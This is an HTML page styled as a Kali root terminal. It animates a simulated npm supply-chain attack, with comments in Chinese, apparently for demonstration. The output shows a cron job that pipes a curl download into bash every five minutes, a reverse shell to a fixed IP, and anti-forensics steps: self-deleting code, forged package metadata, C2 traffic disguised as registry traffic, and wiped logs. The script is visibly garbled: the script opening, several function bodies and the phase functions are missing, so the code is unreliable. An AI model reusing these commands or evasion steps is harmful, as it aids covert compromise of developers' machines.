<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>root@kali:~/target — Terminal</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            font-family: 'JetBrains Mono', 'Consolas', 'Monaco', monospace;
            height: 100vh;
            overflow: hidden;
        }

        /* CRT scanline overlay */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 0, 0, 0.15),
                rgba(0, 0, 0, 0.15) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: 100;
        }

        /* Subtle screen glow */
        body::after {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(ellipse at center, rgba(20, 50, 20, 0.08) 0%, transparent 70%);
            pointer-events: none;
            z-index: 99;
        }

        .terminal {
            width: 100%;
            height: 100%;
            background: #0a0a0a;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        /* Tmux-style status bar TOP */
        .tmux-bar {
            height: 22px;
            background: #1a1a1a;
            border-bottom: 1px solid #333;
            display: flex;
            align-items: center;
            padding: 0 8px;
            font-size: 11px;
            color: #5faf5f;
            font-weight: 700;
        }

        .tmux-left {
            display: flex;
            gap: 2px;
        }

        .tmux-tab {
            padding: 2px 12px;
            background: #5faf5f;
            color: #000;
        }

        .tmux-tab.inactive {
            background: #333;
            color: #888;
        }

        .tmux-right {
            margin-left: auto;
            display: flex;
            gap: 12px;
            color: #888;
        }

        .tmux-right span {
            color: #5faf5f;
        }

        /* Terminal body */
        .terminal-body {
            flex: 1;
            padding: 8px 12px;
            overflow-y: auto;
            font-size: 12px;
            line-height: 1.5;
            color: #d0d0d0;
        }

        .terminal-body::-webkit-scrollbar {
            width: 6px;
        }

        .terminal-body::-webkit-scrollbar-track {
            background: #0a0a0a;
        }

        .terminal-body::-webkit-scrollbar-thumb {
            background: #333;
        }

        .line {
            display: flex;
            align-items: flex-start;
            gap: 0;
            margin-bottom: 1px;
            opacity: 0;
            animation: fadeIn 0.03s ease forwards;
            white-space: pre-wrap;
            word-break: break-all;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        /* Prompt style: root@kali:~/target# */
        .prompt {
            color: #5faf5f;
            font-weight: 700;
        }

        .prompt-user { color: #5faf5f; }
        .prompt-host { color: #5faf5f; }
        .prompt-path { color: #5f87d7; }
        .prompt-sym { color: #d0d0d0; }

        .text { color: #d0d0d0; }
        .text.dim { color: #666; }
        .text.green { color: #5faf5f; }
        .text.red { color: #d75f5f; }
        .text.yellow { color: #d7af5f; }
        .text.blue { color: #5f87d7; }
        .text.cyan { color: #5fafd7; }
        .text.magenta { color: #d75faf; }

        .cursor {
            display: inline-block;
            width: 7px;
            height: 14px;
            background: #5faf5f;
            animation: blink 0.8s step-end infinite;
            vertical-align: text-bottom;
        }

        @keyframes blink {
            50% { opacity: 0; }
        }

        /* Section headers with ASCII art style */
        .section-hr {
            color: #444;
            margin: 4px 0;
            letter-spacing: 2px;
        }

        /* Key reveal - dark background, monospace */
        .key-dump {
            background: #151515;
            margin: 2px 0 2px 24px;
            padding: 6px 10px;
            font-size: 10px;
            color: #d75f5f;
            font-family: 'JetBrains Mono', monospace;
            line-height: 1.7;
            border-left: 2px solid #d75f5f;
        }

        /* Trojan block */
        .trojan-block {
            margin: 2px 0 2px 24px;
            padding: 4px 0;
            border-left: 2px solid #d75faf;
            padding-left: 12px;
        }

        .trojan-title {
            color: #d75faf;
            font-weight: 700;
            margin-bottom: 2px;
        }

        .trojan-item {
            color: #af87d7;
            line-height: 1.6;
            font-size: 11px;
        }

        /* Anti-forensics block */
        .anti-block {
            margin: 2px 0 2px 24px;
            padding: 4px 0;
            border-left: 2px solid #d7af5f;
            padding-left: 12px;
        }

        .anti-title {
            color: #d7af5f;
            font-weight: 700;
            margin-bottom: 2px;
        }

        .anti-item {
            color: #af875f;
            line-height: 1.6;
            font-size: 11px;
        }

        .anti-ok { color: #5faf5f; }
        .anti-fail { color: #d75f5f; }

        /* Final summary block */
        .summary-block {
            margin: 4px 0;
            padding: 8px 12px;
            background: #151515;
            border-left: 3px solid #d75f5f;
        }

        .summary-title {
            color: #d75f5f;
            font-weight: 700;
            margin-bottom: 4px;
            font-size: 12px;
        }

        .summary-item {
            color: #d7af5f;
            padding-left: 12px;
            line-height: 1.7;
            font-size: 11px;
        }

        /* Tmux status bar BOTTOM */
        .tmux-bottom {
            height: 22px;
            background: #1a1a1a;
            border-top: 1px solid #333;
            display: flex;
            align-items: center;
            padding: 0 8px;
            font-size: 11px;
            color: #888;
        }

        .tmux-bottom-left {
            display: flex;
            gap: 8px;
        }

        .tmux-bottom-right {
            margin-left: auto;
            display: flex;
            gap: 12px;
        }

        .tmux-bottom-right span {
            color: #5faf5f;
        }
    </style>
</head>

        function createLine(html, delay = 0) {

            line.style.animationDelay = delay + 's';
            line.innerHTML = html;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }

        function prompt() {
            return '<span class="prompt"><span class="prompt-user">root</span>@<span class="prompt-host">kali</span>:<span class="prompt-path">~/target</span><span class="prompt-sym"># </span></span>';
        }

        function comment(text) {
            return '<span class="text dim"># ' + text + '</span>';

            createLine(comment('crontab -l — 查看已安装的持久化定时任务'));
            await sleep(200);
            createLine('<span class="text dim">  [c2] Executing: crontab -l</span>');
            await sleep(100);
            createLine('<span class="text green">  [c2] */5 * * * * curl -s https://registry.npmjs.org/r/axios-utils | bash</span>');
            await sleep(200);

            createLine('<span class="text green">  [c2] Persistence confirmed. Cron job installed for beaconing.</span>');
            await sleep(300);

            // 最终统计
            createLine('');
            createLine(comment('攻击总结：供应链攻击成功，所有反取证措施已生效'));
            await sleep(300);
            createLine('<div class="summary-block">' +
                '<div class="summary-title">[!] 攻击完成 — 远程访问木马已植入</div>' +
                '<div class="summary-item">* RAT 已安装至 /var/lib/.systemd-update/，进程名伪装为 "node"</div>' +
                '<div class="summary-item">* 反向 shell 活跃: 185.220.101.47:443，PID 2847 隐藏于进程列表</div>' +
                '<div class="summary-item">* 反取证: 恶意代码自删除，setup.js 替换为无害存根</div>' +
                '<div class="summary-item">* 反取证: 包元数据被替换，npm info 显示完全正常的包信息</div>' +
                '<div class="summary-item">* 反取证: C2 回调伪装成 npm registry 流量，绕过网络监控</div>' +
                '<div class="summary-item">* 反取证: shell 历史、syslog、npm 缓存全部清除</div>' +
                '<div class="summary-item">* 持久化: crontab 每 5 分钟 beacon 一次，确保长期控制</div>' +
                '<div class="summary-item">* 事后检查: ps/netstat/npm info/syslog 均无法发现异常</div>' +
                '<div class="summary-item">* 攻击者已获得 root shell，可执行任意命令、窃取任意数据</div>' +
                '</div>');
            await sleep(600);
        }

        // 命令序列（自动推进）
        const commandSequence = [
            { cmd: 'ps aux | grep node', phase: phase2_ps },
            { cmd: 'npm info axios', phase: phase3_npm_info },
            { cmd: 'cat /var/log/syslog | grep npm', phase: phase4_logs },
            { cmd: 'attacker', phase: phase5_attacker },
        ];

        let currentPhaseIndex = 0;
        let phaseRunning = false;
        let started = false;

        async function runNextPhase() {
            if (currentPhaseIndex >= commandSequence.length) return;
            if (phaseRunning) return;

            phaseRunning = true;
            const { cmd, phase } = commandSequence[currentPhaseIndex];

            // 显示命令
            createLine(prompt() + '<span class="text">' + cmd + '</span>');
            await sleep(600);

            // 执行阶段
            await phase();

            currentPhaseIndex++;
            phaseRunning = false;

            // 如果还有下一阶段，自动显示提示并推进
            if (currentPhaseIndex < commandSequence.length) {
                await sleep(400);
                createLine('');
                createLine(prompt() + '<span class="cursor"></span>');
                await sleep(1000);
                // 自动推进到下一阶段
                await runNextPhase();
            } else {
                // 所有阶段完成
                createLine('');
                createLine(prompt() + '<span class="cursor"></span>');
            }
        }

        // 初始显示：只显示命令文本，等待用户按回车
        createLine(prompt() + '<span class="text">ps aux | grep node</span><span class="cursor"></span>');

        // 等待用户按回车开始
        document.addEventListener('keydown', async (e) => {
            if (e.key === 'Enter' && !started) {
                started = true;
                // 移除光标，开始执行
                const lastLine = terminal.lastElementChild;
                if (lastLine) {
                    const cursor = lastLine.querySelector('.cursor');
                    if (cursor) cursor.remove();
                }
                await sleep(200);
                await runNextPhase();
            }
        });
    </script>
